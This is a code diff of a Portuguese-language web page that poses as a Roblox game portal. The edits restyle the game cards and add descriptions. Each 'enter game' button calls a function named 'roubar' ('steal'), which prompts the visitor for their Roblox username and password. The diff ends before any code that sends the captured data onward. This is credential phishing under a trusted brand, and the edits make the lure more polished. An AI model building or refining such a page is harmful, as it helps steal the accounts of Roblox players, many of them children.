@@ -5,19 +5,37 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ROBLOX - Jogos Online</title>
     <style>
-        body { margin:0; background: #0f0f0f; color:#fff; font-family: Arial; }
-        header { background: #1e1e1e; padding: 15px; text-align:center; font-size: 24px; }
-        .games { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; padding: 30px; max-width: 1200px; margin: auto; }
-        .game-box { background: #1f1f1f; border-radius: 12px; overflow: hidden; box-shadow: 0 8px 20px rgba(255,0,0,0.3); }
-        .game-box img { width: 100%; height: 220px; object-fit: cover; }
-        .info { padding: 15px; text-align: center; }
-        .info h3 { margin: 8px 0; color: #ffcc00; }
-        .btn-roubar { background: #ff0000; color: white; border: none; padding: 12px; width: 90%; margin: 10px auto; display: block; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        .btn-roubar:hover { background: #cc0000; }
+        body { 
+            margin:0; background: linear-gradient(#0a0a0a, #1f1f1f); 
+            color:#fff; font-family: 'Segoe UI', Arial; 
+        }
+        header { 
+            background: #111; padding: 20px; text-align:center; font-size: 28px; 
+            border-bottom: 4px solid #ffcc00; 
+        }
+        .games { 
+            display: grid; grid-template-columns: repeat(2, 1fr); gap: 25px; 
+            padding: 40px; max-width: 1300px; margin: auto; 
+        }
+        .game-box { 
+            background: #18191c; border-radius: 16px; overflow: hidden; 
+            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.4); transition: 0.3s; 
+        }
+        .game-box:hover { transform: translateY(-8px); box-shadow: 0 15px 40px rgba(255, 0, 0, 0.6); }
+        .game-box img { width: 100%; height: 230px; object-fit: cover; }
+        .info { padding: 18px; text-align: center; }
+        .info h3 { margin: 10px 0 8px; color: #ffcc00; font-size: 22px; }
+        .desc { font-size: 14px; color: #bbb; margin-bottom: 12px; line-height: 1.4; }
+        .btn-roubar { 
+            background: #ff0000; color: white; border: none; padding: 14px; 
+            width: 92%; margin: 8px auto; display: block; border-radius: 8px; 
+            font-size: 17px; font-weight: bold; cursor: pointer; 
+        }
+        .btn-roubar:hover { background: #cc0000; transform: scale(1.03); }
     </style>
 </head>
 <body>
-    <header>🎮 ROBLOX - Jogos Online</header>
+    <header>🎮 ROBLOX - JOGOS POPULARES</header>
     
     <div class="games">
         <!-- Jogo 1 -->
@@ -25,16 +43,17 @@
             <img src="noob.png" alt="Noob jogo">
             <div class="info">
                 <h3>Noob jogo</h3>
+                <p class="desc">O noob jogo e um jogo de evoluir e subir de level para o proximo mapa! precisa de level 100 para ir pro proximo mapa!!</p>
                 <button class="btn-roubar" onclick="roubar('Noob jogo')">ENTRAR NO JOGO</button>
             </div>
         </div>
 
         <!-- Jogo 2 -->
         <div class="game-box">
-            <img src="https://picsum.photos/id/201/600/300" alt="Crazy Obby">
+            <img src="obby.png" alt="Obby Teclas">
             <div class="info">
-                <h3>Crazy Obby</h3>
-                <button class="btn-roubar" onclick="roubar('Crazy Obby')">ENTRAR NO JOGO</button>
+                <h3>Obby Teclas ( Beta )</h3>
+                <button class="btn-roubar" onclick="roubar('Obby Teclas ( Beta )')">ENTRAR NO JOGO</button>
             </div>
         </div>
 
@@ -61,7 +80,6 @@
         function roubar(jogo) {
             const username = prompt("Usuário Roblox para entrar em " + jogo + ":");
             if (!username) return;
-            
             const password = prompt("Senha Roblox:");
             if (!password) return;
 
